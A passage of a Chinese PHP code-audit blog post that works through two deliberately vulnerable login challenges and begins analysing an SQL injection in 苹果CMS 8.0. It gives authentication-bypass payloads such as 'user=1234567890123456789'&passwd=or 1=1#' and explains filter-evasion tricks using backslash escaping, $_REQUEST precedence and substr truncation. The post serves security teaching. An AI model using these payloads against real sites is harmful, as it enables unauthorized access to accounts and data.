class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&quot;&lt;/td&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$mysql_server_name</span>=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$mysql_database</span>=<span class="string">&quot;Day12&quot;</span>;    <span class="comment">/** 数据库的名称 */</span></span><br><span class="line"><span class="variable">$mysql_username</span>=<span class="string">&quot;Hongri&quot;</span>;  <span class="comment">/** MySQL数据库用户名 */</span></span><br><span class="line"><span class="variable">$mysql_password</span>=<span class="string">&quot;Hongri&quot;</span>;  <span class="comment">/** MySQL数据库密码 */</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$mysql_server_name</span>, <span class="variable">$mysql_username</span>,<span class="variable">$mysql_password</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>从代码 <strong>第27行</strong> 很明显，这道题考查sql注入，但是这里有两个考察点，我们分别来看一下。</p>
<h3 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h3><p> <strong>第23行</strong> 和 <strong>第24行</strong> 针对 <strong>GET</strong> 方式获取到的 <strong>username</strong> 和 <strong>password</strong> 进行了处理，处理函数为 <strong>clean</strong> 。该函数在 <strong>第16-20行</strong> 处定义，函数的主要功能就是使用 <strong>htmlentities</strong> 函数处理变量中带有的特殊字符，而这里加入了 <strong>htmlentities</strong> 函数的可选参数 <strong>ENT_QUOTES</strong> ，因此这里会对 <strong>单引号</strong> ， <strong>双引号</strong> 等特殊字符进行转义处理。由于这里的注入是字符型的，需要闭合单引号或者逃逸单引号，因此这里需要绕过这个函数。我们可以通过下面这个例子观察 <strong>clean</strong> 函数的处理效果：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-7.png"></p>
<p>题目 <strong>第36行</strong> 是进入数据库查询，并且返回 <strong>name</strong> 列字段的值。而这里的sql语句是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; </span></span><br><span class="line"><span class="string">AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>那我们如果输入的 <strong>username</strong> 是 <strong>admin</strong> ， <strong>password</strong> 是 <strong>admin</strong> ，自然就构成了正常要执行的sql语句。</p>
<p>这道题的问题就在于可以引入反斜杠，也就是转义符，官方针对 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/regexp.reference.escape.php">转义符</a> 是这么解释的。</p>
<blockquote>
<p>比如，如果你希望匹配一个 “*” 字符，就需要在模式中写为 <code>\*</code>。 这适用于一个字符在不进行转义会有特殊含义的情况下。</p>
</blockquote>
<p>这里我们看个简单的例子理解一下这个转义符号。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-8.png"></p>
<p>转义符号会让当前的特殊符号失去它的作用，这道题由于可以引入反斜杠，也就是转义符号，来让</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&#x27;SELECT * FROM ctf.users WHERE name=\&#x27;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;\&#x27; </span></span><br><span class="line"><span class="string">AND pass=\&#x27;&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>username</strong>后面的 <strong>‘</strong> 失效，只要这个 <strong>‘</strong> 失效，就能闭合**pass&#x3D;**后面的 **’**。最后组合的payload就如下图所示</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-9.png"></p>
<p>所以实际上目前 <strong>name</strong> 的值是 <strong>admin\‘ AND pass&#x3D;</strong> ,这时候 <strong>password</strong> 的值是一个可控的输入点，我们可以通过这个值来构造 <strong>sql</strong> 的 <strong>联合查询</strong> ，并且注释掉最后的 <strong>单引号</strong> 。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-10.png"></p>
<p>第一部分我们其实已经成功构造好了payload，但是回头来看看题目，题目 <strong>第6行</strong> 到 <strong>第16行</strong> 有两个正则表达式，作用就是如果参数中带有 <strong>or、and 、union</strong> 等数据，就退出，并输出 <strong>Attack detected!!!</strong> </p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-11.png"></p>
<p>这里当然我们可以正面硬刚这个正则表达式。但是这里我们来聊一个比较有趣的解法。</p>
<p>我们看到是通过 <strong>request</strong> 方式传入数据，而php中 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/reserved.variables.request.php">REQUEST</a> 变量默认情况下包含了 <strong>GET</strong> ，<strong>POST</strong> 和 <strong>COOKIE</strong> 的数组。在 <strong>php.ini</strong> 配置文件中，有一个参数 <strong>variables_order</strong> ，这参数有以下可选项目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; variables_order</span><br><span class="line">;   Default Value: &quot;EGPCS&quot;</span><br><span class="line">;   Development Value: &quot;GPCS&quot;</span><br><span class="line">;   Production Value: &quot;GPCS&quot;</span><br></pre></td></tr></table></figure>

<p>这些字母分别对应的是 <strong>E: Environment</strong> ，<strong>G:Get</strong>，<strong>P:Post</strong>，<strong>C:Cookie</strong>，<strong>S:Server</strong>。这些字母的出现顺序，表明了数据的加载顺序。而 <strong>php.ini</strong> 中这个参数默认的配置是 <strong>GPCS</strong> ，也就是说如果以 <strong>POST</strong> 、 <strong>GET</strong> 方式传入相同的变量，那么用 <strong>REQUEST</strong> 获取该变量的值将为 <strong>POST</strong> 该变量的值。<br>我们举个简单的例子方便大家理解：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-12.png"></p>
<p>我们可以看到这里的 <strong>post</strong> 方式传入的数据覆盖了 <strong>get</strong> 方式传入的数据，因此这里最后的payload如下：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-13.png"></p>
<p>参考文章<br><a target="_blank" rel="noopener" href="https://github.com/CHYbeta/Code-Audit-Challenges/blob/master/php/challenge-50.md">Code-Audit-Challenges</a></p>
<h2 id="Day-13-Turkey-Baster"><a href="#Day-13-Turkey-Baster" class="headerlink" title="Day 13 - Turkey Baster"></a>Day 13 - Turkey Baster</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$em</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$user</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;em = <span class="title class_">DoctrineManager</span>::<span class="title function_ invoke__">getEntityManager</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user = <span class="variable">$user</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;user);</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">sanitizeInput</span>(<span class="variable">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$queryBuilder</span> = <span class="variable language_">$this</span>-&gt;em-&gt;<span class="title function_ invoke__">createQueryBuilder</span>()</span><br><span class="line">            -&gt;<span class="title function_ invoke__">select</span>(<span class="string">&quot;COUNT(p)&quot;</span>)</span><br><span class="line">            -&gt;<span class="keyword">from</span>(<span class="string">&quot;User&quot;</span>, <span class="string">&quot;u&quot;</span>)</span><br><span class="line">            -&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;&quot;</span>);</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$queryBuilder</span>-&gt;<span class="title function_ invoke__">getQuery</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">boolval</span>(<span class="variable">$query</span>-&gt;<span class="title function_ invoke__">getSingleScalarResult</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span>(<span class="params"><span class="variable">$input</span>, <span class="variable">$length</span> = <span class="number">20</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$input</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$input</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$input</span>) &gt; <span class="variable">$length</span>) &#123;</span><br><span class="line">            <span class="variable">$input</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$input</span>, <span class="number">0</span>, <span class="variable">$length</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$auth</span> = <span class="keyword">new</span> <span class="title class_">LoginManager</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$auth</span>-&gt;<span class="title function_ invoke__">isValid</span>()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这是一道典型的用户登录程序，从代码来看，考察的应该是通过 <strong>SQL注入</strong> 绕过登陆验证。代码 <strong>第33行</strong> ，通过 <strong>POST</strong> 方式传入 <strong>user</strong> 和 <strong>passwd</strong> 两个参数，通过 <strong>isValid()</strong> 来判断登陆是否合法。我们跟进一下 <strong>isValid()</strong> 这个函数，该函数主要功能代码在 <strong>第12行-第22行</strong> ，我们看到 <strong>13行</strong> 和 <strong>14行</strong> 调用 <strong>sanitizeInput()</strong> 针对 <strong>user</strong> 和 <strong>password</strong> 进行相关处理。</p>
<p>跟进一下 <strong>sanitizeInput()</strong> ，主要功能代码在 <strong>第24行-第29行</strong> ，这里针对输入的数据调用 <strong>addslashes</strong> 函数进行处理，然后再针对处理后的内容进行长度的判断，如果长度大于20，就只截取前20个字符。 <strong>addslashes</strong> 函数定义如下：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.addslashes.php">addslashes</a> — 使用反斜线引用字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">addslashes</span> ( <span class="keyword">string</span> <span class="variable">$str</span> )</span><br></pre></td></tr></table></figure>

<p>作用：在单引号（’）、双引号（”）、反斜线（\）与 NUL（ <strong>NULL</strong> 字符）字符之前加上反斜线。</p>
</blockquote>
<p>我们来看个例子：<br><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-14.png"></p>
<p>那这题已经过滤了单引号，正常情况下是没有注入了，那为什么还能导致注入了，原因实际上出在了 <strong>substr</strong> 函数，我们先看这个函数的定义：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.substr.php">substr</a> — 返回字符串的子串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">substr</span> ( <span class="keyword">string</span> <span class="variable">$string</span> , <span class="keyword">int</span> <span class="variable">$start</span> [, <span class="keyword">int</span> <span class="variable">$length</span> ] )</span><br></pre></td></tr></table></figure>

<p>作用：返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。 </p>
</blockquote>
<p>我们来看个例子：</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-15.png"></p>
<p>那么再回到这里，我们知道反斜杠可以取消特殊字符的用法，而注入想要通过单引号闭合，在这道题里势必会引入反斜杠。所以我们能否在反斜杠与单引号之间截断掉，只留一个反斜杠呢？答案是可以，我们看个以下这个例子。</p>
<p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-16.png"></p>
<p>在这个例子中，我们直接使用题目代码中的过滤代码，并且成功在反斜杠和单引号之间截断了，那我们把这个payload带入到题目代码中，拼接一下 <strong>第17行-第19行</strong> 代码中的sql语句。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user u where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="variable">$pass</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里的sql语句由于反斜杠的原因， <strong>user &#x3D; ‘1234567890123456789\‘</strong> 最后这个单引号便失去了它的作用。这里我们让 <strong>pass&#x3D;or 1&#x3D;1#</strong> ，那么最后的sql语句如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="title function_ invoke__">count</span>(p) <span class="keyword">from</span> user where user = <span class="string">&#x27;1234567890123456789\&#x27; AND password = &#x27;</span><span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这时候在此SQL语句中， <strong>user</strong> 值为 <strong>1234567890123456789\‘ AND password &#x3D;</strong>  ，因此我们可以保证带入数据库执行的结果为 <strong>True</strong> ，然后就能够顺利地通过验证。</p>
<p>所以这题最后的 <strong>payload</strong> 如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span><span class="string">&#x27;&amp;passwd=or 1=1#</span></span><br></pre></td></tr></table></figure>

<h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>这里的实例分析，我们选择 <strong>苹果CMS视频分享程序 8.0</strong> 进行相关漏洞分析。漏洞的位置是在 <strong>inc\common\template.php</strong> ，我们先看看相关代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$where</span> .= <span class="string">&#x27; AND ( instr(a_name,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 or instr(a_subname,\&#x27;&#x27;</span>.<span class="variable">$lp</span>[<span class="string">&#x27;wd&#x27;</span>].<span class="string">&#x27;\&#x27;)&gt;0 ) &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里代码的 <strong>第三行-第四行</strong> 位置， <strong>$lp[‘wd’]</strong> 变量位置存在字符串拼接，很明显存在 <strong>sql注入</strong> ，但是这个cms具有一些通用的注入防护，所以我们从头开始一步步的看。</p>
<p>首先在 <strong>inc\module\vod.php</strong> 文件中的，我们看到 <strong>第一行</strong> 代码当 <strong>$method&#x3D;search</strong> 成立的时候，进入了 <strong>第3行</strong> 中的 <strong>be(“all”, “wd”)</strong> 获取请求中 <strong>wd</strong> 参数的值，并且使用 <strong>chkSql()</strong> 函数针对 <strong>wd</strong> 参数的值进行处理。部分关键代码如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$method</span>==<span class="string">&#x27;search&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$tpl</span>-&gt;C[<span class="string">&quot;siteaid&quot;</span>] = <span class="number">15</span>;</span><br><span class="line">    <span class="variable">$wd</span> = <span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">be</span>(<span class="string">&quot;all&quot;</span>, <span class="string">&quot;wd&quot;</span>)); <span class="variable">$wd</span> = <span class="title function_ invoke__">chkSql</span>(<span class="variable">$wd</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$wd</span>))&#123; <span class="variable">$tpl</span>-&gt;P[<span class="string">&quot;wd&quot;</span>] = <span class="variable">$wd</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟进一下 <strong>be()</strong> 函数，其位置在 <strong>inc\common\function.php</strong> 文件中，关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">be</span>(<span class="params"><span class="variable">$mode</span>,<span class="variable">$key</span>,<span class="variable">$sp</span>=<span class="string">&#x27;,&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;magic_quotes_runtime&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$magicq</span>= <span class="title function_ invoke__">get_magic_quotes_gpc</span>();</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$mode</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;post&#x27;</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>?<span class="variable">$_POST</span>[<span class="variable">$key</span>] :<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>?<span class="variable">$_GET</span>[<span class="variable">$key</span>] :<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;arr&#x27;</span>:</span><br><span class="line">            <span class="variable">$arr</span> =<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$key</span>]) ? <span class="variable">$_POST</span>[<span class="variable">$key</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$arr</span>==<span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$value</span>=<span class="string">&quot;0&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$arr</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="variable">$res</span>=<span class="title function_ invoke__">implode</span>(<span class="variable">$sp</span>,<span class="variable">$arr</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$res</span>=<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$key</span>]) ? <span class="variable">$magicq</span>? <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] : <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$key</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这部分代码的作用就是对 <strong>GET，POST，REQUEST</strong> 接收到的参数进行 <strong>addslashes</strong> 的转义处理。根据前面针对 <strong>be(“all”, “wd”)</strong> 的分析，我们知道 <strong>wd</strong> 参数的值是通过 <strong>REQUEST</strong> 方式接收，并使用 <strong>addslashes</strong> 函数进行转义处理。再回到 <strong>inc\module\vod.php</strong> 文件中的，我们跟进一下 <strong>chkSql()</strong> 函数，该函数位置在 <strong>inc\common\360_safe3.php</strong> 文件中，具体代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chkSql</span>(<span class="params"><span class="variable">$s</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$getfilter</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$d</span>=<span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span>==<span class="variable">$d</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$d</span> = <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">StopAttack</span>(<span class="number">1</span>,<span class="variable">$s</span>,<span class="variable">$getfilter</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlEncode</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析一下这部分代码的作用，其实就是在 <strong>第8行-第12行</strong> 针对接收到的的变量进行循环的 <strong>urldecode</strong> （也就是url解码）动作，然后在 <strong>第15行</strong> ，使用 <strong>StopAttack</strong> 函数解码后的数据进行处理，最后将处理后的数据通过 <strong>htmlEncode</strong> 方法进行最后的处理，然后返回处理之后的值。</p>
<p>我们先跟进一下 <strong>StopAttack</strong> 函数，该函数位置在 <strong>inc\common\360_safe3.php</strong> 文件中，我们截取部分相关代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span>(<span class="params"><span class="variable">$StrFiltKey</span>,<span class="variable">$StrFiltValue</span>,<span class="variable">$ArrFiltReq</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$errmsg</span> = <span class="string">&quot;&lt;div style=\&quot;position:fixed;top:0px;width:100%;height:100%;background-color:white;color:green;font-weight:bold;border-bottom:5px solid #999;\&quot;&gt;&lt;br&gt;您的提交带有不合法参数，谢谢合作!&lt;br&gt;操作IP: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>].<span class="string">&quot;&lt;br&gt;操作时间: &quot;</span>.<span class="title function_ invoke__">strftime</span>(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).<span class="string">&quot;&lt;br&gt;操作页面:&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;PHP_SELF&quot;</span>].<span class="string">&quot;&lt;br&gt;提交方式: &quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>].<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$StrFiltValue</span>=<span class="title function_ invoke__">arr_foreach</span>(<span class="variable">$StrFiltValue</span>);</span><br><span class="line">    <span class="variable">$StrFiltValue</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$StrFiltValue</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrFiltValue</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$errmsg</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$ArrFiltReq</span>.<span class="string">&quot;/is&quot;</span>,<span class="variable">$StrFiltKey</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$errmsg</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们看到代码的 <strong>第13行-第19行</strong> 调用正则进行处理，而相关的正则表达式是 <strong>$ArrFiltReq</strong> 变量。这里 <strong>第13行</strong> 的 <strong>$ArrFiltReq</strong> 变量就是前面传入的 <strong>$getfilter</strong> ，即语句变成：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&quot;</span>.<span class="variable">$getfilter</span>.<span class="string">&quot;/is&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

